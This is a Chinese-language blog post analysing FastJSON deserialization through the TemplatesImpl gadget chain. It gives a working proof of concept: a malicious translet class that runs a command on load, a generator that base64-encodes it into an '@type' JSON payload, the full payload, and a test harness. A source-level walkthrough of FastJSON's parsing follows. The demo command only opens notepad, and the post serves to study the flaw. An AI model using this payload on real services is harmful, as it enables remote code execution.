---
title: FastJSON反序列化分析
tags:
  - Java
  - 反序列化
  - FastJSON
categories: 
  - Java
  - FastJSON
  - 反序列化
description: FastJSON反序列分析
excerpt: FastJSON反序列化分析
typora-root-url: Fastjson反序列化分析
abbrlink: 60762
date: 2022-03-28 20:36:19
---

## FastJSON反序列化分析

### 关于FastJSON

fastjson是alibaba开源的一款高性能功能完善的JSON库。

### 漏洞测试

> 使用的是TemplatesImpl链，解析JSON时需要加上**Feature.SupportNonPublicField**

写一个恶意类，可以参考[CC2链 基于字节码的利用](https://blog.evalexp.top/p/51973/#0x424-基于字节码的利用链)：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Test extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("notepad");
        } catch (java.io.IOException e) {
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {}
}
```

然后生成POC：

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.io.IOUtils;
import org.apache.commons.codec.binary.Base64;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

/**
 * Created by web on 2017/4/29.
 */
public class Poc {

    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());

    }

    public static void  test_autoTypeDeny() throws Exception {
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty("file.separator");
        final String evilClassPath = System.getProperty("user.dir") + "/target/classes/Test.class";
        String evilCode = readClass(evilClassPath);
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String text1 = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+evilCode+"\"],\"_name\":\"a.b\",\"_tfactory\":{ },\"_outputProperties\":{ }," +
                "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
        System.out.println(text1);
    }
    public static void main(String args[]){
        try {
            test_autoTypeDeny();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

生成的格式化JSON：

```json
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": [
    "yv66vgAAADQALwoABwAhCgAiACMIACQKACIAJQcAJgcAJwcAKAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTFRlc3Q7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACkBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAJgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcAKgwAKwAsAQAHbm90ZXBhZAwALQAuAQATamF2YS9pby9JT0V4Y2VwdGlvbgEABFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAABAABAAgACQABAAoAAAAvAAEAAQAAAAUqtwABsQAAAAIACwAAAAYAAQAAAAkADAAAAAwAAQAAAAUADQAOAAAAAQAPABAAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABIADAAAACAAAwAAAAEADQAOAAAAAAABABEAEgABAAAAAQATABQAAgAVAAAABAABABYAAQAPABcAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABUADAAAACoABAAAAAEADQAOAAAAAAABABEAEgABAAAAAQAYABkAAgAAAAEAGgAbAAMACAAcAAkAAQAKAAAATwACAAEAAAAOuAACEgO2AARXpwAES7EAAQAAAAkADAAFAAMACwAAABIABAAAAAwACQAOAAwADQANAA8ADAAAAAIAAAAdAAAABwACTAcAHgAAAQAfAAAAAgAg"
  ],
  "_name": "a.b",
  "_tfactory": {},
  "_outputProperties": {},
  "_name": "a",
  "_version": "1.0",
  "allowedProtocols": "all"
}
```

然后使用POC进行测试：

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.io.*;
import java.nio.charset.StandardCharsets;


public class Main {

    public static String getFileContent(String filename) throws IOException {
        String content = "";
        StringBuilder builder = new StringBuilder();
        File file = new File(System.getProperty("user.dir") + "\\" + filename);
        InputStreamReader reader = new InputStreamReader(new FileInputStream(file), StandardCharsets.UTF_8);
        BufferedReader bufferedReader = new BufferedReader(reader);
        while((content = bufferedReader.readLine()) != null){
            builder.append(content);
        }
        return builder.toString();
    }

    public static void main(String[] args) throws Exception {
        String json = getFileContent("test.json");
        ParserConfig config = new ParserConfig();
        System.out.println(json);
        JSON.parse(json, Feature.SupportNonPublicField);
    }
}
```

成功弹出记事本，证明反序列利用成功。

### 漏洞分析

接下来对代码进行分析，看看为什么会出现该漏洞。

直接先在Runtime的exec函数下断点，看一下调用栈：

![image-20220329103617176](./image-20220329103617176.png)

其实这里的利用链比较简单，就是CC2的链，注意我们在CC2中使用了TemplatesImpl的newTransformer方法作为入口，而在TemplatesImpl中有一个方法使getOutputProperties实际也会调用自己的newTransformer方法。

接下来一步一步分析。

在开始parseJSON时，FastJSON会使用默认的JSONParser进行解析：

```java
    public static Object parse(String text, int features) {
        if (text == null) {
            return null;
        }

        DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);
        Object value = parser.parse();

        parser.handleResovleTask(value);

        parser.close();

        return value;
    }
```

接着DefaultJSONParser实际再次调用了自己的parse(Object fieldName)：

```java
public Object parse(Object fieldName) {
        final JSONLexer lexer = this.lexer;
        switch (lexer.token()) {
            // ...
            case LBRACE:
                JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
                return parseObject(object, fieldName);
            // ...
        }
    }
```

JSON格式实际上第一个字符是"{"，因此会进入到case LBRACE，这里又调用了parseObject(object, fieldName)，而这一方法会将JSON对象中的键与值进行解析，当检测到双引号开头时：

```java
if (ch == '"') {
	key = lexer.scanSymbol(symbolTable, '"');
	lexer.skipWhitespace();
	ch = lexer.getCurrent();
	if (ch != ':') {
	throw new JSONException("expect ':' at " + lexer.pos() + ", name " + key);
	}
}
```

这里实际上就使用了scanSymbol去扫描键的名，而我们传入的JSON对象第一个键名是`@type`，接下来会读取其值并且获取其Class：

```java
if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
    String typeName = lexer.scanSymbol(symbolTable, '"');
    Class<?> clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());

    if (clazz == null) {
        object.put(JSON.DEFAULT_TYPE_KEY, typeName);
        continue;
    }

    lexer.nextToken(JSONToken.COMMA);
    if (lexer.token() == JSONToken.RBRACE) {
        lexer.nextToken(JSONToken.COMMA);
        try {
            Object instance = null;
            ObjectDeserializer deserializer = this.config.getDeserializer(clazz);
            if (deserializer instanceof JavaBeanDeserializer) {
                instance = ((JavaBeanDeserializer) deserializer).createInstance(this, clazz);
            }

            if (instance == null) {
                if (clazz == Cloneable.class) {
                    instance = new HashMap();
                } else if ("java.util.Collections$EmptyMap".equals(typeName)) {
                    instance = Collections.emptyMap();
                } else {
                    instance = clazz.newInstance();
                }
            }

            return instance;
        } catch (Exception e) {
            throw new JSONException("create instance error", e);
        }
    }
    
    this.setResolveStatus(TypeNameRedirect);

    if (this.context != null && !(fieldName instanceof Integer)) {
        this.popContext();
    }
    
    if (object.size() > 0) {
        Object newObj = TypeUtils.cast(object, clazz, this.config);
        this.parseObject(newObj);
        return newObj;
    }

    ObjectDeserializer deserializer = config.getDeserializer(clazz);
    return deserializer.deserialze(this, clazz, fieldName);
}
```

而`JSON.DEFAULT_TYPE_KEY`实际上就是`@type`

```java
    public static String           DEFAULT_TYPE_KEY     = "@type";
```

在最后调用ObjectDeserializer的deserialze方法进行反序列化。

而这里的ObjectDeserializer实际上是一个JavaBeanDeserializer，为什么呢？

实际上FastJSON使用了一个IdentityHashMap去维护存在的Deserializer，而当我们的传入的Type在这个HashMap中没有时，就会使用createJavaBeanDeserializer()，从而返回的是一个JavaBeanDeserializer。

接下来的事情实际上就是对这个类的对象的属性进行设置，但是我们的`_bytecodes`实际传入的是一串Base64的字符串，为什么呢？

实际上是因为：

```java
        if (lexer.token() == JSONToken.LITERAL_STRING) {
            byte[] bytes = lexer.bytesValue();
            lexer.nextToken(JSONToken.COMMA);
            return (T) bytes;
        }
```

```java
    public byte[] bytesValue() {
        return IOUtils.decodeBase64(text, np + 1, sp);
    }
```

在这里进行了一次Base64解码。

接下来的实际就是设置属性了，而我们传入的`_outputProperties`是一个空对象，因此会再次进入上面的流程，但是值得注意的是，对象名`_outputProperties`实际其`name`会被解析为`outputProperties`，这是因为在JavaBeanDeserializer的parseField中：

```java
JSONLexer lexer = parser.lexer; // xxx

FieldDeserializer fieldDeserializer = smartMatch(key);
//...
```

而smartMatch会将名字中的下划线与横线去除，从而使得我们的`_outputProperties`变成了`outputProperties`，而这样在smartMatch中：

```java
if (snakeOrkebab) {
    fieldDeserializer = getFieldDeserializer(key2);
    if (fieldDeserializer == null) {
        for (FieldDeserializer fieldDeser : sortedFieldDeserializers) {
            if (fieldDeser.fieldInfo.name.equalsIgnoreCase(key2)) {
                fieldDeserializer = fieldDeser;
                break;
            }
        }
    }
}
```

实际上就调用了`getFieldDeserializer("outputProperties")`，并且这个键在`JavaBeanDeserializer`中的`sortedFieldDeserializers`是存在的，其method为`getOutputProperties`，从而顺利的调用了TemplatesImpl的getOutputProperties方法：

```java
//...
else if (Map.class.isAssignableFrom(method.getReturnType())) {
    Map map = (Map) method.invoke(object);
    if (map != null) {
        map.putAll((Map) value);
    }
//...
```

注意`java.util.Properties`实际继承了`Hashtable`，因此是`Map`的子类，此处条件为真，于是调用了`method.invoke`方法，从而执行了`getOutputProperties`。

### 关于一些疑问

* `sortedFieldDeserializers`是怎么创建的？

在`DefaultJSONParser`的`parseObject`中：

```java
ObjectDeserializer deserializer = config.getDeserializer(clazz);
return deserializer.deserialze(this, clazz, fieldName);
```

其中`config.getDeserializer(clazz)`实际上会找是否存在对应的`Deserializer`，没有则返回：

```java
derializer = createJavaBeanDeserializer(clazz, type);
```

而在该方法中又调用了：

```java
JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);
```

而这一个方法则会生成`sortedFieldDeserializers`，具体规则如下：

```java
for (Method method : methods) { //
            int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;
            String methodName = method.getName();
            if (methodName.length() < 4) {
                continue;
            }

            if (Modifier.isStatic(method.getModifiers())) {
                continue;
            }

            // support builder set
            if (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) {
                continue;
            }
            Class<?>[] types = method.getParameterTypes();
            if (types.length != 1) {
                continue;
            }

            JSONField annotation = method.getAnnotation(JSONField.class);

            if (annotation == null) {
                annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);
            }

            if (annotation != null) {
                if (!annotation.deserialize()) {
                    continue;
                }

                ordinal = annotation.ordinal();
                serialzeFeatures = SerializerFeature.of(annotation.serialzeFeatures());
                parserFeatures = Feature.of(annotation.parseFeatures());

                if (annotation.name().length() != 0) {
                    String propertyName = annotation.name();
                    add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, ordinal, serialzeFeatures, parserFeatures, 
                                                 annotation, null, null));
                    continue;
                }
            }

            if (!methodName.startsWith("set")) { // TODO "set"的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？
                continue;
            }

            char c3 = methodName.charAt(3);

            String propertyName;
            if (Character.isUpperCase(c3) //
                || c3 > 512 // for unicode method name
            ) {
                if (TypeUtils.compatibleWithJavaBean) {
                    propertyName = TypeUtils.decapitalize(methodName.substring(3));
                } else {
                    propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);
                }
            } else if (c3 == '_') {
                propertyName = methodName.substring(4);
            } else if (c3 == 'f') {
                propertyName = methodName.substring(3);
            } else if (methodName.length() >= 5 && Character.isUpperCase(methodName.charAt(4))) {
                propertyName = TypeUtils.decapitalize(methodName.substring(3));
            } else {
                continue;
            }

            Field field = TypeUtils.getField(clazz, propertyName, declaredFields);
            if (field == null && types[0] == boolean.class) {
                String isFieldName = "is" + Character.toUpperCase(propertyName.charAt(0)) + propertyName.substring(1);
                field = TypeUtils.getField(clazz, isFieldName, declaredFields);
            }

            JSONField fieldAnnotation = null;
            if (field != null) {
                fieldAnnotation = field.getAnnotation(JSONField.class);

                if (fieldAnnotation != null) {
                    if (!fieldAnnotation.deserialize()) {
                        continue;
                    }
                    
                    ordinal = fieldAnnotation.ordinal();
                    serialzeFeatures = SerializerFeature.of(fieldAnnotation.serialzeFeatures());
                    parserFeatures = Feature.of(fieldAnnotation.parseFeatures());

                    if (fieldAnnotation.name().length() != 0) {
                        propertyName = fieldAnnotation.name();
                        add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal,
                                                     serialzeFeatures, parserFeatures, annotation, fieldAnnotation, null));
                        continue;
                    }
                }

            }
            
            if (propertyNamingStrategy != null) {
                propertyName = propertyNamingStrategy.translate(propertyName);
            }

            add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,
                                         annotation, fieldAnnotation, null));
        }
```

可以看到，当`propertyName`为`outputProperties`时，会生成一个对应`methodName`为`getOutputProperties`的`FieldInfo`对象加入：

![image-20220329121549777](./image-20220329121549777.png)

